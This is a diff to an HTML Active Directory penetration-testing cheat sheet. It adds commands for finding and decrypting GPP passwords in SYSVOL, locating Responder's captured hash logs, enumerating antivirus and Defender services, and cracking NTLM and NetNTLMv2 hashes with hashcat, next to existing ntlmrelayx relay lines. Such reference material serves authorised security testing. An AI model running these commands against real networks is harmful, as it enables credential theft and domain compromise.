@@ -170,6 +170,10 @@ ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span
 <span class="c1"># Run executable</span>
 ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span>-e<span class="w"> </span>evil.exe
 </code></pre></div>
+<p>*Note: Any recovered hashed credentials with <code>responder</code> are printed to STD OUT and also saved to a John the Ripper compliant file, located at <code>/usr/share/responder/logs/</code></p>
+<ul>
+<li>The files are named in the following format - (Module-Name)-(HASH-TYPE)-(Client-IP).txt</li>
+</ul>
 <h3 id="dns-takeover-via-ipv6">DNS takeover via IPv6</h3>
 <p>Start <code>mitm6</code> to respond with spoofed IPv6 DNS responses:</p>
 <div class="highlight"><pre><span></span><code>mitm6<span class="w"> </span>-d<span class="w"> </span>&lt;target<span class="w"> </span>domain&gt;
@@ -221,6 +225,10 @@ ntlmrelayx.py<span class="w"> </span>-6<span class="w"> </span>-t<span class="w"
 <li><a href="https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/">Taking over Windows Workstations thanks to LAPS and PXE</a></li>
 </ul>
 <h3 id="crack-gpp">Crack GPP</h3>
+<p>Find GPP Passwords in SYSVOL:</p>
+<div class="highlight"><pre><span></span><code>findstr<span class="w"> </span>/S<span class="w"> </span>cpassword<span class="w"> </span><span class="nv">$env</span>:logonserver<span class="se">\s</span>ysvol<span class="se">\*</span>.xml<span class="w"> </span><span class="c1"># Powershell</span>
+findstr<span class="w"> </span>/S<span class="w"> </span>cpassword<span class="w"> </span>%logonserver%<span class="se">\s</span>ysvol<span class="se">\*</span>.xml<span class="w"> </span><span class="c1"># CMD</span>
+</code></pre></div>
 <p>If some GPP relevant file is obtained from SYSVOL, it's possible to crack every password entry with the following command:</p>
 <div class="highlight"><pre><span></span><code>gpp-decrypt<span class="w"> </span>&lt;cPassword&gt;
 </code></pre></div>
@@ -562,8 +570,7 @@ remote registry on the target)(<code>PowerView</code>):</p>
 <li>Divide those values by <em>-600000000</em> to obtain the amount of minutes.</li>
 </ul>
 <p>Finding workstations and the domain controller:</p>
-<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="n">directory</span><span class="p">\</span><span class="n">ldap</span> <span class="n">-Class</span> <span class="n">ds_computer</span> <span class="p">|</span> <span class="nb">where </span><span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">ds_useraccountcontrol</span> <span class="o">-match</span> <span class="p">&lt;</span><span class="n">user</span> <span class="nb">type </span><span class="n">constant</span><span class="p">&gt;</span>
-<span class="p">}</span> <span class="p">|</span> <span class="nb">select </span><span class="n">ds_cn</span><span class="p">,</span> <span class="n">ds_dnshostname</span><span class="p">,</span> <span class="n">ds_operatingsystem</span><span class="p">,</span> <span class="n">ds_lastlogon</span><span class="p">,</span> <span class="n">ds_pwdlastset</span>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="n">directory</span><span class="p">\</span><span class="n">ldap</span> <span class="n">-Class</span> <span class="n">ds_computer</span> <span class="p">|</span> <span class="nb">where </span><span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">ds_useraccountcontrol</span> <span class="o">-match</span> <span class="p">&lt;</span><span class="n">user</span> <span class="nb">type </span><span class="n">constant</span><span class="p">&gt;}</span> <span class="p">|</span> <span class="nb">select </span><span class="n">ds_cn</span><span class="p">,</span> <span class="n">ds_dnshostname</span><span class="p">,</span> <span class="n">ds_operatingsystem</span><span class="p">,</span> <span class="n">ds_lastlogon</span><span class="p">,</span> <span class="n">ds_pwdlastset</span>
 </code></pre></div>
 <p>where <code>&lt;user type constant&gt;</code> is a User Account Control (UAC) constant mapped as follows:</p>
 <table>
@@ -650,9 +657,14 @@ remote registry on the target)(<code>PowerView</code>):</p>
 <p>Enumerate all the machines in the domain:</p>
 <div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="n">directory</span><span class="p">\</span><span class="n">ldap</span> <span class="n">-Class</span> <span class="n">ds_computer</span> <span class="p">|</span> <span class="nb">select </span><span class="n">ds_cn</span>
 </code></pre></div>
-<p>Enumerate antivirus:</p>
-<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="n">securitycenter2</span> <span class="n">-Class</span> <span class="n">antivirusproduct</span>
+<p>Enumerate antivirus on workstations:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="n">securitycenter2</span> <span class="n">-Class</span> <span class="n">antivirusproduct</span> <span class="c"># see note below</span>
+<span class="nb">Get-CimInstance</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">/</span><span class="n">SecurityCenter2</span> <span class="n">-ClassName</span> <span class="n">AntivirusProduct</span> <span class="c"># see note below</span>
+<span class="nb">Get-Service</span> <span class="n">WinDefend</span> <span class="c"># Check for windows defender</span>
+<span class="nb">Get-Service</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">DisplayName</span> <span class="o">-like</span> <span class="s2">"*Defend*"</span> <span class="o">-or</span> <span class="nv">$_</span><span class="p">.</span><span class="n">DisplayName</span> <span class="o">-like</span> <span class="s2">"*McAfee*"</span> <span class="o">-or</span> <span class="nv">$_</span><span class="p">.</span><span class="n">DisplayName</span> <span class="o">-like</span> <span class="s2">"*Symantec*"</span> <span class="o">-or</span> <span class="nv">$_</span><span class="p">.</span><span class="n">DisplayName</span> <span class="o">-like</span> <span class="s2">"*Kaspersky*"</span> <span class="p">}</span>
+<span class="nb">Get-Process</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">ProcessName</span> <span class="o">-like</span> <span class="s2">"*McShield*"</span> <span class="o">-or</span> <span class="nv">$_</span><span class="p">.</span><span class="n">ProcessName</span> <span class="o">-like</span> <span class="s2">"*avp*"</span> <span class="p">}</span>
 </code></pre></div>
+<p>*Note: these commands would not work with Windows Server 2019</p>
 <h3 id="sharphound_1">Sharphound</h3>
 <p>Collect information for <code>Bloodhound</code>:</p>
 <div class="highlight"><pre><span></span><code>Sharphound.exe<span class="w"> </span>--CollectionMethods<span class="w"> </span>&lt;Methods&gt;<span class="w"> </span>--Domain<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>--ExcludeDCs
@@ -846,6 +858,12 @@ python<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span 
 <h2 id="misc">Misc</h2>
 <p>Force computer policy sync with DC:</p>
 <div class="highlight"><pre><span></span><code><span class="n">gpupdate</span> <span class="p">/</span><span class="n">force</span>
+</code></pre></div>
+<p>Crack NTLM hash with <code>hashcat</code>:</p>
+<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">1000</span><span class="w"> </span>&lt;hashes<span class="w"> </span>file&gt;<span class="w"> </span>&lt;wordlist&gt;
+</code></pre></div>
+<p>Crack NetNTLMv2 hash with <code>hashcat</code>:</p>
+<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">5600</span><span class="w"> </span>&lt;hashes<span class="w"> </span>file&gt;<span class="w"> </span>&lt;wordlist&gt;
 </code></pre></div>
   </div>
   <div class="tag-cloud">
